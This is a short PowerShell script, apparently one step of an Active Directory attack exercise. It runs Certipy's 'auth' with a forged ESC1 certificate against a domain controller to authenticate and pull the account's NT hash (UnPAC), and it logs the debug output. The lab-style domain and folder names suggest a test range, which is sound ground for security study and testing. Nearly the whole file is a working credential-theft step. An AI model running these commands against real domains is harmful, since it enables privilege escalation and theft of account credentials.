# T050 auth (UnPAC) with -debug, output to file
$ErrorActionPreference = "Continue"
$certpy = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts\certipy.exe"
Set-Location C:\Tools\cadre-attack
$pfx = "C:\Tools\cadre-attack\C__Tools_cadre-attack_esc1.pfx"
$log = "C:\Tools\cadre-attack\auth-debug.log"
Remove-Item $log -ErrorAction SilentlyContinue
if (Test-Path $pfx) {
  & $certpy auth -pfx $pfx -dc-ip 192.168.77.10 -domain cadre.local -debug *> $log
  Write-Output "auth_rc=$LASTEXITCODE"
  Write-Output "=== log ==="
  Get-Content $log | Select-Object -Last 30
} else { Write-Output "NO_PFX" }
Write-Output "=== AUTH3_DONE ==="
